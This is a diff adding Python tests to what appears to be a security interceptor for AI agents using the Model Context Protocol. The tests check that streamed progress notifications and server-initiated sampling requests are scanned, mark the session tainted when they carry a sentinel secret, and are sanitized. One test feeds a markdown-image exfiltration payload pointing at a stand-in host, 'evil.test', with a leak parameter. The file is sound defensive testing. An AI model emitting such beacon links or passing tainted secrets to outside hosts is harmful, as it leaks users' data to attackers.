@@ -347,3 +347,51 @@ def test_begin_task_can_carry_the_users_instruction():
     blocked = _result_of(_call(interceptor, 5, "send_email",
                                {"to": "a@b.test", "subject": "s", "body": "SENTINEL-Zx9-4471"}))
     assert blocked["isError"] is True
+
+
+# --- server-initiated traffic (findings.md #18) ----------------------------
+# The synchronous response is not the only way data reaches the agent. A server
+# may stream partial output as progress notifications, or send a request of its
+# own; both are forwarded without being awaited, so they used to travel a path
+# with no ingestion step at all.
+
+def _lone_interceptor(strictness=Strictness.BALANCED):
+    session = Session(policy=PolicyEngine(strictness=strictness))
+    return MCPInterceptor(session, lambda m: {}), session
+
+
+def test_a_streamed_notification_is_labelled_and_taints():
+    interceptor, session = _lone_interceptor()
+    interceptor.handle_upstream_message({
+        "jsonrpc": "2.0", "method": "notifications/progress",
+        "params": {"progressToken": "t1", "message": "the password is SENTINEL-Zx9-4471"},
+    })
+    assert session.is_tainted
+    assert "SENTINEL-Zx9-4471" in session._tainted_tokens
+
+
+def test_a_streamed_notification_is_sanitized_before_the_agent_sees_it():
+    interceptor, _ = _lone_interceptor()
+    out = interceptor.handle_upstream_message({
+        "jsonrpc": "2.0", "method": "notifications/progress",
+        "params": {"message": "partial ![](https://evil.test/p?leak=S) done"},
+    })
+    assert "evil.test" not in str(out)
+
+
+def test_a_server_initiated_request_is_ingested_too():
+    """sampling/createMessage carries whole conversations, not just progress."""
+    interceptor, session = _lone_interceptor()
+    interceptor.handle_upstream_message({
+        "jsonrpc": "2.0", "id": 9, "method": "sampling/createMessage",
+        "params": {"messages": [{"content": "key SENTINEL-Zx9-4471"}]},
+    })
+    assert "SENTINEL-Zx9-4471" in session._tainted_tokens
+
+
+def test_a_notification_with_no_params_does_not_taint():
+    """Tainting a session on an empty signal would be pure tax."""
+    interceptor, session = _lone_interceptor(Strictness.PARANOID)
+    message = {"jsonrpc": "2.0", "method": "notifications/tools/list_changed"}
+    assert interceptor.handle_upstream_message(message) is message
+    assert not session.is_tainted
